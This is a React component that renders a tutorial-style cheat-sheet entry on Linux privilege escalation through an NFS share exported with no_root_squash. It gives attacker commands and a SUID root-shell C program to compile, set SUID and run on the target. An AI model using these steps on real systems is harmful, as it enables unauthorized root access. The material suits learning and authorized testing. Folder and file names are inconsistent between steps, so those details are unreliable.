import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const NFS = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              Network File Sharing (NFS) configuration is kept in the{" "}
              <Typography display="inline" className="highlight">
                /etc/exports
              </Typography>{" "}
              file. This file is created during the NFS server installation and
              can usually be read by users.
            </Typography>
            <Box sx={{ m: 4 }} />
            <img src="/NFS.png" width={772} height={346} />
            <Typography>
              The critical element for this privilege escalation vector is the{" "}
              <Typography display="inline" className="highlight">
                no_root_squash
              </Typography>{" "}
              option you can see above. If the{" "}
              <Typography display="inline" className="highlight">
                no_root_squash
              </Typography>{" "}
              option is present on a writable share, we can create an executable
              with SUID bit set and run it on the target system.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Attacker Machine: Check what NFS is mounted on the server.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"showmount -e {IP}"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              Check if any of the mounted shares have{" "}
              <Typography display="inline" className="highlight">
                no_root_squash
              </Typography>{" "}
              option. This is located in{" "}
              <Typography display="inline" className="highlight">
                /etc/exports
              </Typography>{" "}
              .
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Create a local folder to mount, and mount to the NFS
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"mkdir /tmp/attackfolder"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"mount -o rw {IP}:/{folder} /tmp/attackfolder"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              Create an exploit file in /tmp/attackerfolder
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"int main(){\n" +
                "  setgid(0);\n" +
                "  setuid(0);\n" +
                '  system("/bin/bash");\n' +
                "  return 0;\n" +
                "}"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"gcc nsf.c -o nfs -w"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"chmod +s nfs"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>Run the exploit file on the server</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"./nfs"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default NFS;
